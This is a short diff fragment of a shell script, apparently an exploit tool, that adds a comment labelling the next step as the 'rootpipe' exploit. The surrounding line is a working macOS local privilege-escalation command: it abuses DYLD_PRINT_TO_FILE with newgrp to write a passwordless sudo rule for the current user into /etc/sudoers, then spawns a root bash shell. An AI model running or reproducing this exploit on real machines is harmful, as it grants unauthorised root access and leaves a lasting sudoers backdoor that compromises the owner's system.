@@ -27,6 +27,7 @@ function KeepSafe {
 echo -e '\033[1mExploiting machine...\033[0m'
 echo
 
+#--- EPLOIT THE MACHINE WITH ROOTPIPE ---#
 echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo bash <<'INJECTINTOBASH'
 #!/bin/bash
 #--- CHECK FOR ROOT ---#
